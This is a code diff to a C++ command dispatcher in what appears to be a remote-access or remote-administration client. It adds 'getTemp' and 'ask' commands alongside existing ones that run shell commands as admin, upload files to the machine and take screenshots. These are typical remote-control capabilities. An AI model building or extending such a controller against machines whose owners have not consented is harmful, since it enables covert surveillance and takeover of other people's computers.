@@ -59,6 +59,10 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		Shell::exeAdmin(client, args[1]);
 	}	  // ----------------------------------------TRANSFER ------------------------------------
+	else if (args[0] == "getTemp" && args.size() == 1)
+	{
+		Transfer::getTemp(client);
+	}
 	else if (args[0] == "upload" && args.size() == 2)
 	{
 		Transfer::uploadToClient(client, args[1]);
@@ -70,6 +74,14 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	else if (args[0] == "screenshot" && args.size() ==1)
 	{
 		Transfer::screenshot(client);
+	}
+	else if (args[0] == "ask" && args.size() == 2)
+	{
+		Transfer::ask(client,args[1], DEFAULT_NAME);
+	}
+	else if (args[0] == "ask" && args.size() == 3)
+	{
+		Transfer::ask(client, args[1], args[2]);
 	}
 	else
 		client->send_b(("Command " + buffer + " not found").c_str());
